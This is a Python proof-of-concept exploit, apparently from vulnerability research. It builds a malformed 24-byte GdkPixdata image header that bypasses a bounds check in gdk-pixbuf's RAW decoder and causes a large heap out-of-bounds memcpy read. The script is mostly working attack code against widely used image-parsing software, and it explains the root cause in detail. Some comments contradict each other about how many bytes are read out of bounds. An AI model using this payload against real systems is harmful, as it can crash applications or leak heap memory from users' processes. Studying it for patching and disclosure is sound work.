#!/usr/bin/env python3
"""
VULN-001: GdkPixdata RAW decoder heap OOB read
gdk-pixdata.c:235 (bounds check bypass) + gdk-pixdata.c:506 (memcpy OOB)

Root cause: when pixdata->length == GDK_PIXDATA_HEADER_LENGTH (24),
the check `stream_length < pixdata->length - GDK_PIXDATA_HEADER_LENGTH`
becomes `stream_length < 0` which is always FALSE (unsigned subtraction).
This allows zero pixel bytes to pass, then memcpy reads rowstride*height
bytes from pixdata->pixel_data which points 1 byte past the 24-byte buffer.
"""

import struct
import os

# GdkPixdata header format (all big-endian uint32):
# [0-3]   magic       = 0x47646b50 ("GdkP")
# [4-7]   length      = total stream length (header + pixel_data)
# [8-11]  pixdata_type
# [12-15] rowstride
# [16-19] width
# [20-23] height

GDK_PIXDATA_HEADER_LENGTH = 24
MAGIC = 0x47646b50  # "GdkP"

# pixdata_type = sample_width(8-bit=0x01<<24) | encoding(RAW=0x01<<16) | color_type(RGB=0x01)
# = 0x01000000 | 0x00010000 | 0x00000001 = 0x01010001
PIXDATA_TYPE_RGB_RAW_8BIT = 0x01010001

# Craft minimal header: length = 24 (= header only, no pixel data)
# This triggers the bypass: 24 - 24 = 0, check is stream_length < 0 => always False
# Use large rowstride*height so OOB read far exceeds GString's over-allocation (~64 bytes).
# g_try_malloc_n(height=100, rowstride=10000) = 1MB — allocatable.
# memcpy then reads 1,000,000 bytes from pixdata->pixel_data which has 0 valid bytes.
width      = 100
height     = 100
rowstride  = 10000      # >> width; large to overwhelm GString internal buffer
length     = GDK_PIXDATA_HEADER_LENGTH  # 24 — triggers the OOB path

header = struct.pack(">IIIIII",
    MAGIC,
    length,
    PIXDATA_TYPE_RGB_RAW_8BIT,
    rowstride,
    width,
    height,
)

assert len(header) == GDK_PIXDATA_HEADER_LENGTH, f"Header length mismatch: {len(header)}"
# No pixel_data bytes appended — total file is exactly 24 bytes.
# memcpy will read rowstride*height = 3 bytes past end of buffer => heap OOB read.

out_dir = os.path.dirname(os.path.abspath(__file__))
out_path = os.path.join(out_dir, "vuln_001.gdkp")

with open(out_path, "wb") as f:
    f.write(header)

print(f"Written {len(header)} bytes to {out_path}")
print(f"  magic=0x{MAGIC:08x}  length={length}  pixdata_type=0x{PIXDATA_TYPE_RGB_RAW_8BIT:08x}")
print(f"  rowstride={rowstride}  width={width}  height={height}")
print(f"  pixel_data bytes in file: 0  (triggers OOB: memcpy reads {rowstride*height:,} bytes past end)")
